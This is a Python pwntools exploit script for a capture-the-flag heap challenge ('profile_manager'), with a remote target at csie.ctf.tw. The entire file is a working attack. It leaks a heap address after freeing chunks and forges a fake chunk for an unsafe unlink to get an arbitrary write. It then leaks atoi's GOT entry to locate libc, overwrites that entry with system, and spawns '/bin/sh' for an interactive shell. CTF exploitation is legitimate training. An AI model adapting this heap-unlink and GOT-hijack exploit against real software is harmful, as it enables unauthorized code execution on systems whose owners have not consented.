import pwn
import pwnlib

pwn.context.terminal = ['tmux', 'splitw', '-h']

ADD_PROFILE_CODE = '1'
SHOW_PROFILE_CODE = '2'
EDIT_PROFILE_CODE = '3'
DELETE_PROFILE_CODE = '4'

address_atoi_got = 0x602098
address_profile = 0x602100
num_profile = 0

def add_profile(p, name, age, size, desc):
    global num_profile
    print 'add_profile', num_profile, name, age, size, desc
    rtn_index = num_profile
    num_profile += 1

    p.sendlineafter('Your choice :', ADD_PROFILE_CODE)
    p.sendafter('Name :', name)
    p.sendlineafter('Age :', str(age))
    p.sendlineafter('Length of description :', str(size))
    p.sendafter('Description :', desc)

    return rtn_index

def show_profile(p, index):
    print 'show_profile', index
    p.sendlineafter('Your choice :', SHOW_PROFILE_CODE)
    p.sendlineafter('ID :', str(index))
    return None

def edit_profile(p, index, name='\x00', age=0, desc='\x00'):
    print 'edit_profile', index, name, age, desc

    p.sendlineafter('Your choice :', EDIT_PROFILE_CODE)
    p.sendlineafter('ID :', str(index))
    p.sendafter('Name :', name)
    if name != '\x00':
        p.sendlineafter('Age :', str(age))
        p.sendafter('Description :', desc)
    return None

def delete_profile(p, index):
    print 'delete_profile', index

    p.sendlineafter('Your choice :', DELETE_PROFILE_CODE)
    p.sendlineafter('ID :', str(index))
    return None

if __name__ == '__main__':
    if pwnlib.args.args['REMOTE']:
        p = pwn.connect('csie.ctf.tw', 10140)
    else:
        p = pwn.process('./profile_manager-53eb91391ff43a88dfebcde578afd125d2c681f7')

    libc_elf = pwn.ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

    add_profile(p, 'x'*15, 0x20, 0x100, 'y'*100) # 0
    add_profile(p, 'x'*15, 0x20, 0x100, 'z'*100) # 1

    edit_profile(p, 1) # free 1
    edit_profile(p, 0) # free 0

    # leak heap
    show_profile(p, 0)
    print p.recvuntil('= Name : ')
    leak_heap = pwn.u64(p.recvline(keepends=False).ljust(0x8, '\x00'))
    heap_base = leak_heap - 0x100 - 0x10 - 0x20
    print hex(leak_heap), hex(heap_base)

    # unlink
    size_r = 0x98+0x10
    magic_place = heap_base + 0x130*2 + size_r - 0x10
    print hex(magic_place)

    # free 1, allocate 1
    edit_profile(p, 1, pwn.p64(magic_place), 0x20, 'a'*100) # name chunk 1.fd = address

    fake_chunk = pwn.p64(0x100+0x10+0x10) # fake prev_size
    fake_chunk += pwn.p64(size_r-0x10-0x8) # fake size
    fake_chunk += pwn.p64(address_profile + 0x8*3*2 + 0x10 - 0x18) # fake fd = &r - 0x18
    fake_chunk += pwn.p64(address_profile + 0x8*3*2 + 0x10 - 0x10) # fake bk = &r - 0x10

    payload = '\x22'*0x20
    payload += '\x22'*(size_r - 0x10 - 0x20 - 0x8) # padding
    payload += pwn.p64(0x20)[:-1] # fake prev_size2
    print hex(len(payload))

    index_r = add_profile(p, 'x'*15, 0x20, size_r-0x10, payload ) # get chunk name 0, 2
    add_profile(p, pwn.p64(magic_place)[:-1], 0x20, 0x100, 'c'*100 ) # get chunk name 1, 3
    add_profile(p, pwn.p64(0x110)[:-1], 0x20, 0x100, 'd'*100) # 4

    pwn.gdb.attach(p, '''
    b *0x4012d1
    commands
        heapinfo
        x/15xg 0x602100
        c
    end
    c
    '''.format(hex(0x602100 + 0x8*3*3 + 0x10)))

    payload = fake_chunk
    payload += '\x22'*(size_r - 0x10 - 0x20 - 0x8) # padding
    payload += pwn.p64(size_r-0x10-0x8)[0]

    edit_profile(p, 2, '\x33'*15, 0x20, payload)
    delete_profile(p, 3)

    # p[index_r].desc = &p[index_r] - 0x18 = &p[index_r-1].desc
    edit_profile(p, index_r, '\x44'*15, 0x20, pwn.p64(address_atoi_got))

    # p[index_r-1].desc = address_atoi_got
    # leak atoi got
    p.clean()
    p.unrecv('Your choice :')
    show_profile(p, index_r-1)
    p.recvuntil('= Desc : ')
    leak_atoi_got = pwn.u64(p.recvline(keepends=False).ljust(0x8, '\x00'))
    print hex(leak_atoi_got)

    libc_base = leak_atoi_got - libc_elf.symbols['atoi']
    system_got = libc_elf.symbols['system'] + libc_base

    # hijack atoi got to system
    edit_profile(p, index_r-1, '\x55'*15, 0x20, pwn.p64(system_got))

    p.clean()

    p.send('/bin/sh\x00')

    p.interactive()
